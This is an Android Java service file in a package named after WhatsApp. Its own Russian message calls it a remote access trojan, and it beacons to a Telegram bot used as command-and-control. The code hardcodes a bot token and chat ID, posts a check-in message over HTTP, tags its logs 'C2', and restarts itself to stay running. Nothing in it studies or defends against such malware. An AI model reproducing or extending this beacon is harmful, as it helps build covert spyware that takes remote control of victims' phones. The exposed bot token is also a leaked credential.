package com.example.whatsapp;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;
import android.os.Handler;
import android.os.Looper;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class CoreService extends Service {
    private static final String BOT_TOKEN = "9149088713:AAHDnVftf8JvwlzSKtVhEcd5lioeyn7-cpI";
    private static final String CHAT_ID = "6717914771";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Показываем уведомление, что сервис запущен
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(getApplicationContext(), "Сервис запущен", Toast.LENGTH_LONG).show();
            }
        });

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String text = "Приветствую, Bruno. Рат успешно написан. Скрипт написан: @lotrexyx";
                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/json");

                    String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + text + "\"}";
                    OutputStream os = conn.getOutputStream();
                    os.write(json.getBytes("UTF-8"));
                    os.close();

                    int responseCode = conn.getResponseCode();
                    Log.d("C2", "Telegram response: " + responseCode);
                } catch (Exception e) {
                    Log.e("C2", "Error sending", e);
                }
            }
        }).start();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
